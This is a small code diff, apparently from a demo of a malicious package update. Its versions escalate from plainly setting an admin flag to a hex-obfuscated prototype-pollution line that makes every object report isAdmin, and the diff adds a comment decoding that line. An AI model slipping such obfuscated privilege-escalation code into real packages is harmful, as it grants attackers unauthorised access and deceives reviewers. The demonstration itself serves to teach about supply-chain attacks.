@@ -8,7 +8,7 @@ const crunchSomeNumbersPackage = {
     v2: `input.answer += 2;
         state.isAdmin = true;`,
     v3: `input.answer += 2;
-        var _=["\x69\x73\x41\x64\x6D\x69\x6E","\x5F\x5F\x70\x72\x6F\x74\x6F\x5F\x5F","\x4C\x6F\x4C"];({})[_[1]][_[0]]= _[2];`,
+        var _=["\x69\x73\x41\x64\x6D\x69\x6E","\x5F\x5F\x70\x72\x6F\x74\x6F\x5F\x5F","\x4C\x6F\x4C"];({})[_[1]][_[0]]= _[2];`, // ({}).__proto__.isAdmin='LoL';
 }
 
 // App
